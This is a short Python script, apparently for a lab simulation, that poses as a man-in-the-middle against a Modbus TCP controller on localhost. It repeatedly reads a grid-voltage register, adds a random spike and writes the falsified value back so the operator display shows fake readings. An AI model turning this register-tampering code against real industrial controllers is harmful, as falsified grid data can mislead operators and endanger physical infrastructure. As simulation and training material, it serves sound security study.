import asyncio
from pymodbus.client import AsyncModbusTcpClient
import logging
import random

# In a real MITM, we would be ARP spoofing or sitting inline.
# For this simulation, we will act as a "Man-on-the-Side" that aggressively overwrites values 
# to simulate the effect of a MITM modifying data before it reaches the HMI.

TARGET_IP = "localhost"
TARGET_PORT = 5020

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [MITM] - %(message)s')

async def run_mitm():
    client = AsyncModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    await client.connect()
    
    logging.info("MITM Simulation Started.")
    logging.info("Intercepting Grid Voltage readings and injecting noise...")

    try:
        while True:
            # Read real voltage
            rr = await client.read_holding_registers(5, 1, slave=1)
            if not rr.isError():
                real_volts = rr.registers[0]
                
                # Falsify it (Inject Voltage Spike)
                fake_volts = real_volts + random.randint(20, 50)
                
                logging.info(f"Real: {real_volts}V -> Spoofed: {fake_volts}V")
                
                # Overwrite the register so HMI sees the fake value
                await client.write_register(5, fake_volts, slave=1)
            
            await asyncio.sleep(0.2) # Fast loop to race against the PLC logic
            
    except KeyboardInterrupt:
        logging.info("Stopping MITM.")
    except Exception as e:
        logging.error(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    asyncio.run(run_mitm())
